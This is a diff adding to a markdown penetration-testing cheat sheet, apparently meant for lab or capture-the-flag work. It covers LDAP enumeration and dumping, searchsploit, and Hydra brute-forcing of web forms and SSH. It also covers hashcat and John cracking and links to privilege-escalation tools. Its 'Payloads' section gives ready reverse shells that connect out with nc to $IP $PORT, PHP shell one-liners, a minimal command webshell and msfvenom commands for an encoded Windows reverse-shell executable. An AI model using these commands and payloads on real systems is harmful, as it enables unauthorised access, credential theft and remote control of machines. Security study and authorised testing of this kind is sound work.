@@ -274,14 +274,200 @@ enum4linux $HOST
 
 - ldapsearch  
 
-**todo**
+Basic enum :  
+```
+ldapsearch -h $HOST -x -s base namingcontexts
+```
+-h : host  
+-x : simple authentication  
+-s : scope  
 
+Can be followed by :  
+```
+ldapsearch -h $HOST -x -b "DC=$DOMAIN" > ldap.out
+```
+-b : branch  
+Example :  
+`ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" > ldap.out`  
 
+You may also want to apply filters, for example by requesting only users :  
+```
+ldapsearch -h $HOST -x -b "DC=$DOMAIN" '(objectClass=user)'
+```
+
+And for each user, its sAMAccountName :  
+```
+ldapsearch -h $HOST -x -b "DC=$DOMAIN" '(objectClass=user)' sAMAccountName
+```
+
+- ldapdomaindump  
+
+Tool for dumping all LDAP info with valid creds :
+```
+ldapdomaindump -u $HOST\\$USER -p $PWD $DOMAIN
+```
+Example :  
+`ldapdomaindump -u 10.10.10.10\\alice -p 'Password123!' domain.local`  
 
 ## Vulnerabilities
 
+- Searchsploit  
+
+Off-line tool for searching exploit-db.  
+
+Basic search :  
+```
+searchsploit $KEYWORDS
+```
+Examples :  
+`searchsploit ms17-010`  
+`searchsploit apache 2.4`  
+
+Get details about exploit :  
+```
+searchsploit -x $EXPLOIT
+```
+
+Copy exploit in current directory :  
+```
+searchsploit -m $EXPLOIT
+```
+
+Update database :  
+```
+searchsploit -u
+```
+
 ## Bruteforce
+
+- Hydra  
+
+Web basic authentication :
+```
+hydra -l $USER -P $WORDLIST $HOST -s $PORT http-get /$DIRECTORY/$PATH
+```
+Example :  
+`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -s 8080 /example/directory`  
+
+Web FORM Post :
+```
+hydra -l $USER -P $WORDLIST $HOST http-post-form "/:username=^USER^&password=^PASS^&Login=Login:invalid"
+```
+Example :  
+`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^&Login=Login:invalid"`  
+**Replace values accordingly (username, password, etc.)**  
+
+SSH :  
+```
+hydra -l $USER -P $WORDLIST ssh://$HOST:$PORT
+```
+Example :  
+`hydra -l alice -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10:2222`  
+
+-f : quits after first login/password found  
+
+- Hashcat  
+
+I tend to prefer John over hashcat since it's (imho) easier to use but I should definitely look more into it.
+```
+hashcat -m $HASH-TYPE -a $MODE $HASH $WORDLIST
+```
+Example (Kerberoast) :  
+`hashcat -m 13100 -a 0 spn.hash /usr/share/wordlists/rockyou.txt`  
+
+- John  
+
+```
+john $HASH $WORDLIST
+```
+It's often as easy as "give him the password and the wordlist and let him do its thing", it automatically find the correct hash format and attempt to crack it.  
 
 ## Payloads
 
+Some reverse shell payloads I've found successful :  
+
+- shell  
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
+```
+
+- PHP  
+```
+<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
+```
+or
+```
+$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");
+```
+
+- Webshells  
+
+Minimal webshell :
+```
+<?php echo system(($_REQUEST['cmd'])); ?>
+```
+Execute with :  
+`http://host/page?cmd=whoami`  
+
+- msfvenom  
+
+List payloads :  
+```
+msfvenom -l payloads
+```
+
+General syntax :  
+```
+msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FILE_FORMAT > $OUTPUT_FILE
+```
+
+Reverse shell Windows :  
+```
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe -o $OUTPUT_FILE
+```
+Example :  
+`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -b "\x00" -e x86/shikata_ga_nai -f exe -o rev.exe`  
+
+-a : architecture  
+-b : bad characters  
+-e : encoding  
+
+
 ## Privesc
+
+Tools are here to help enumerate, but you should definitely do manual enumeration as well 
+
+### Tools
+
+- Linux  
+
+[pspy](https://github.com/DominicBreuker/pspy)  
+[LinEnum](https://github.com/rebootuser/LinEnum)  
+[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
+
+- Windows  
+
+[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)  
+[BloodHound](https://github.com/BloodHoundAD/BloodHound)  
+with [SharpHound](https://github.com/BloodHoundAD/SharpHound3)  
+[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)  
+with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)  
+and [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  
+[SessionGopher](https://github.com/Arvanaghi/SessionGopher)  
+[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)  
+
+### Manual enum
+
+- Linux  
+
+
+
+
+
+
+
+
+
+
+
+
